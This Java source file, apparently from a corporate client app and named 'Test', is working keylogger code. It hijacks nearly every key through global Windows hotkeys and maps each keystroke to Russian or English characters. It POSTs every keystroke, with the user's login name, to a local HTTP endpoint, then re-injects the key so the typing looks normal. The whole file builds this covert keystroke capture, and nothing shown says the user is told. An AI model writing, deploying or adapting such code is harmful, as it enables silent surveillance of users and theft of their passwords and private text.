package ru.kolaer.client.javafx;


import java.awt.event.KeyEvent;
import java.awt.im.InputContext;
import java.nio.charset.Charset;
import java.util.Locale;
import org.springframework.http.converter.StringHttpMessageConverter;
import org.springframework.web.client.RestTemplate;

import ru.kolaer.client.javafx.tools.User32;
import ru.kolaer.client.javafx.tools.User32.MSG;


public class Test {
    //private static volatile int idSeq = 0;
	private final RestTemplate restTemplate = new RestTemplate();	
	private final String username = System.getProperty("user.name");
    private boolean listen;
    private Thread thread;
    private boolean isCapsLock = false;
    
    private boolean isRus = false;

    KeyWithName[] map;
	 public Test() {		 
		 restTemplate.getMessageConverters()
	        .add(0, new StringHttpMessageConverter(Charset.forName("UTF-8")));
		 map = getListCode();
		 Runnable runnable = new Runnable() {
	            public void run() {

	                MSG msg = new MSG();
	                InputContext inputContex = InputContext.getInstance();
	                if(inputContex.getLocale().getLanguage().equals(new Locale("ru").getLanguage()))
	                	isRus = true;
	                
	                for(int i = 8; i <= 222; i++){
	                	User32.RegisterHotKey(null, i, 0, map[i].code);               		
	                	User32.RegisterHotKey(null, i+1000, 0x0001, map[i].code);
	                	User32.RegisterHotKey(null, i+2000, 0x0002, map[i].code);
	                	User32.RegisterHotKey(null, i+3000, 0x0004, map[i].code);
	                	User32.RegisterHotKey(null, i+4000, 0x0008, map[i].code);
	                }
	                listen = true;
	                
	                if(User32.GetKeyState(20) == 1)
	                	isCapsLock = true;
   	                else
   	                	isCapsLock = false;
	                
	                boolean shift = false;
	                boolean ctrl = false;
	                boolean alt = false;
	                
	                while (listen) {
	                    while (User32.PeekMessage(msg, null, 0,0, User32.PM_REMOVE)) {
	                        if (msg.message == User32.WM_HOTKEY) {
	                        	
	                            int id = msg.wParam.intValue();

	                            if(id>4000)
	                            	id -= 4000;
	                            else if(id>3000)
	                            	id -= 3000;
	                            else if(id>2000)
	                            	id -= 2000;
	                            if(id>1000)
	                            	id -= 1000;
	                           

	                           User32.UnregisterHotKey(null, id);
	                           User32.UnregisterHotKey(null, id+1000);
	                           User32.UnregisterHotKey(null, id+2000);
	                           User32.UnregisterHotKey(null, id+3000);
	                           User32.UnregisterHotKey(null, id+4000);
	                           
		       	               if(id == 20)
		       	            	   isCapsLock = !isCapsLock;
		       	               
				       	   		 Thread t2 = new Thread(new Runnable() {
				     				
				       				@Override
				       				public void run() {
				       					if(User32.GetKeyboardLayout(0) == 25) {
				       						isRus = true;
				       					} else 
				       						isRus = false;
				       				}
				       			});
				       			 t2.start();
				       			 try {
				       				t2.join();
				       			} catch (InterruptedException e2) {
				       				e2.printStackTrace();
				       			}
	                           String key = isRus ? map[id].rus : map[id].eng;                         
	                           
	                           
	                           if(User32.GetKeyState(16) < 0) {
	                        	   if(65 <= id && id <= 90) {
	                        		   key = isCapsLock ? key.toLowerCase() : key.toUpperCase();
	                        	   } else {
	                        		   switch (id) {
		                        		    case 48 : key = ")"; break;
		                        		    case 49 : key = "!"; break;
											case 50 : key = isRus ? "\"" : "@"; break;
											case 51 : key = isRus ? "№" : "#"; break;
											case 52 : key = isRus ? ";" : "$"; break;
											case 53 : key = "%"; break;
											case 54 : key = isRus ? ":" : "^"; break;
											case 55 : key = isRus ? "?" : "&"; break;
											case 56 : key = "*"; break;
											case 57 : key = "("; break;
											case 187 : key = "+"; break;
											case 189 : key = "_"; break;
											case 192 : key = isRus ? key.toUpperCase() : "`"; break;
											default : break;
	                        		   }
	                        	   }		   
	                           } else if(isCapsLock) {
	                        	   if(65 <= id && id <= 90) {
	                        		   key = key.toUpperCase();
	                        	   }
	                           }

	                           restTemplate.postForObject("http://localhost:8080/kolaer/system/user/"+username+"/key", key, String.class);

	                           System.out.println(" - ID: " + map[id].code + " ("+ key + ")");

                        	   User32.keybd_event(map[id].code, 0, 0, 0);
                        	   
                        	   if(shift) {
		                           if((User32.GetKeyState(0xA1) & 0x8000) == 0) {
	                        		   shift = false;
	                        		   User32.keybd_event(0x10, 0, 2, 0);
	                        	   }
                        	   } else {
                        		   if((User32.GetKeyState(0xA1) & 0x8000) == 32768) {
	                        		   shift = true;
	                        	   }
                        	   }
                        	   
                        	   if(ctrl) {
		                           if((User32.GetKeyState(0xA3) & 0x8000) == 0) {
		                        	   ctrl = false;
	                        		   User32.keybd_event(0x11, 0, 2, 0);
	                        	   }
                        	   } else {
                        		   if((User32.GetKeyState(0xA3) & 0x8000) == 32768) {
                        			   ctrl = true;
	                        	   }
                        	   }
                        	   
                        	   if(alt) {
		                           if((User32.GetKeyState(0xA5) & 0x8000) == 0) {
		                        	   alt = false;
	                        		   User32.keybd_event(0x10, 0, 2, 0);
	                        	   }
                        	   } else {
                        		   if((User32.GetKeyState(0xA5) & 0x8000) == 32768) {
                        			   alt = true;
	                        	   }
                        	   }
	                        	
		   	                	User32.RegisterHotKey(null, id, 0, map[id].code);               		
			                	User32.RegisterHotKey(null, id+1000, 0x0001, map[id].code);
			                	User32.RegisterHotKey(null, id+2000, 0x0002, map[id].code);
			                	User32.RegisterHotKey(null, id+3000, 0x0004, map[id].code);
			                	User32.RegisterHotKey(null, id+4000, 0x0008, map[id].code);
	                           
	                           
	                        }
	                    }
	                }
	            }
	        };

	        thread = new Thread(runnable);
	        thread.start();
	}
	 
	public static void main(String[] args) {
		new Test();
		
	}
	
	
	public static KeyWithName[] getListCode() {
		final KeyWithName[] keys = new KeyWithName[223];
		
		for(int i = 8; i <= 222; i++){
			KeyWithName key = new KeyWithName();
			key.eng = getEngKey(i);
			key.rus = getRusKey(i);
			key.code = i;
			key.event = getKeyEvent(i);
			keys[i] = key;
		}

		return keys;
	}

	public static String getRusKey(int code){
		switch(code) {		
			case 65 : return "ф";
			case 66 : return "и";
			case 67 : return "с";
			case 68 : return "в";
			case 69 : return "у";
			case 70 : return "а";
			case 71 : return "п";
			case 72 : return "р";
			case 73 : return "ш";
			case 74 : return "о";
			case 75 : return "л";
			case 76 : return "д";
			case 77 : return "ь";
			case 78 : return "т";
			case 79 : return "щ";
			case 80 : return "з";
			case 81 : return "й";
			case 82 : return "к";
			case 83 : return "ы";
			case 84 : return "е";
			case 85 : return "г";
			case 86 : return "м";
			case 87 : return "ц";
			case 88 : return "ч";
			case 89 : return "н";
			case 90 : return "я";
			case 186 : return "ж";
			case 188 : return "б";
			case 190 : return "ю";
			case 192 : return "ё";
			case 219 : return "х";
			case 221 : return "ъ";
			case 222 : return "э";
			default : return getEngKey(code);
		}
	}
	
	public static String getEngKey(int code){
		switch(code) {
			case 8 : return "<BaskSpace>";
			case 9 : return "<Tab>";
			case 13 : return "<Enter>";
			case 16 : return "<Shift>";
			case 17 : return "<Ctrl>";
			case 18 : return "<Alt>";
			case 19 : return "<Pause>";
			case 20 : return "<CapsLock>";
			case 27 : return "<Esc>";
			case 32 : return "<Spase>";
			case 33 : return "<PageUp>";
			case 34 : return "<PageDown>";
			case 35 : return "<End>";
			case 36 : return "<Home>";
			case 37 : return "<ArrowLeft>";
			case 38 : return "<ArrowUp>";
			case 39 : return "<ArrowRigth>";
			case 40 : return "<ArrowDown>";
			case 44 : return "<PrtScr>";
			case 45 : return "<Insert>";
			case 46 : return "<Delete>";
			case 48 : return "0";
			case 49 : return "1";
			case 50 : return "2";
			case 51 : return "3";
			case 52 : return "4";
			case 53 : return "5";
			case 54 : return "6";
			case 55 : return "7";
			case 56 : return "8";
			case 57 : return "9";			
			case 65 : return "a";
			case 66 : return "b";
			case 67 : return "c";
			case 68 : return "d";
			case 69 : return "e";
			case 70 : return "f";
			case 71 : return "g";
			case 72 : return "h";
			case 73 : return "i";
			case 74 : return "j";
			case 75 : return "k";
			case 76 : return "l";
			case 77 : return "m";
			case 78 : return "n";
			case 79 : return "o";
			case 80 : return "p";
			case 81 : return "q";
			case 82 : return "r";
			case 83 : return "s";
			case 84 : return "t";
			case 85 : return "u";
			case 86 : return "v";
			case 87 : return "w";
			case 88 : return "x";
			case 89 : return "y";
			case 90 : return "z";			
			case 91 : return "<WinLeft>";
			case 92 : return "<WinRigth>";
			case 93 : return "<Context>";
			case 96 : return "<NumPad 0>";
			case 97 : return "<NumPad 1>";
			case 98 : return "<NumPad 2>";
			case 99 : return "<NumPad 3>";
			case 100 : return "<NumPad 4>";
			case 101 : return "<NumPad 5>";
			case 102 : return "<NumPad 6>";
			case 103 : return "<NumPad 7>";
			case 104 : return "<NumPad 8>";
			case 105 : return "<NumPad 9>";
			case 106 : return "<NumPad *>";
			case 107 : return "<NumPad +>";
			case 109 : return "<NumPad ->";
			case 110 : return "<NumPad  .>";
			case 111 : return "<NumPad />";
			case 112 : return "<F1>";
			case 113 : return "<F2>";
			case 114 : return "<F3>";
			case 115 : return "<F4>";
			case 116 : return "<F5>";
			case 117 : return "<F6>";
			case 118 : return "<F7>";
			case 119 : return "<F8>";
			case 120 : return "<F9>";
			case 121 : return "<F10>";
			case 122 : return "<F11>";
			case 123 : return "<F12>";
			case 144 : return "<NumLock>";
			case 145 : return "<ScrollLock>";
			case 154 : return "<PrintScreen>";
			case 186 : return ";";
			case 187 : return "=";
			case 188 : return ",";
			case 189 : return "-";
			case 190 : return ".";
			case 191 : return "/";
			case 192 : return "~";
			case 219 : return "[";
			case 220 : return "\\";
			case 221 : return "]";
			case 222 : return "'";
			
			default : return String.valueOf("Unknow: " + code);
		}
	}
	
	
	public static int getKeyEvent(int code) {
		switch(code) {
			case 13 : return KeyEvent.VK_ENTER;
			case 91 :
			case 92 : return KeyEvent.VK_WINDOWS;
			case 93 : return KeyEvent.VK_NONCONVERT;
			case 157 : return KeyEvent.VK_NONCONVERT;
			case 186 : return KeyEvent.VK_SEMICOLON;
			case 187 : return KeyEvent.VK_EQUALS;
			case 188 : return KeyEvent.VK_COMMA;
			case 189 : return KeyEvent.VK_MINUS;
			case 190 : return KeyEvent.VK_PERIOD;
			case 191 : return KeyEvent.VK_SLASH;
			case 192 : return KeyEvent.VK_BACK_QUOTE;
			case 219 : return KeyEvent.VK_OPEN_BRACKET;
			case 220 : return KeyEvent.VK_BACK_SLASH;
			case 221 : return KeyEvent.VK_CLOSE_BRACKET;
			default : return code;
		}
	}
	
}



class KeyWithName {
	public KeyWithName() {
		// TODO Auto-generated constructor stub
	}
	public String rus;
	public String eng;
	public int event;
	public int code;
}
